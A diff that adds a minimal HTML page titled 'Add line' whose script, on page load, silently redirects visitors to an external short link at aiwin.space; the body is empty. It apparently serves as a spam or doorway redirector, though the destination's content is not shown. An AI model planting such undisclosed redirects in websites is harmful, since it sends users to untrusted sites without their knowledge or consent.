@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Add line</title>
+    <script type="text/javascript">
+        const links = [
+                     "https://aiwin.space/jpyy01",
+        ];
+        document.addEventListener("DOMContentLoaded", init);
+
+        async function init() {
+            try {
+                autoRedirect();
+            } catch (error) {
+                console.error('发生错误:', error);
+                fallback();
+            }
+        }
+
+        function autoRedirect() {
+            const randomIndex = Math.floor(Math.random() * links.length);
+            const targetUrl = links[randomIndex];
+            redirectToLink(targetUrl);
+        }
+
+        function redirectToLink(targetUrl) {
+            window.location.replace(targetUrl);
+        }
+
+        function fallback() {
+            // 备用逻辑
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
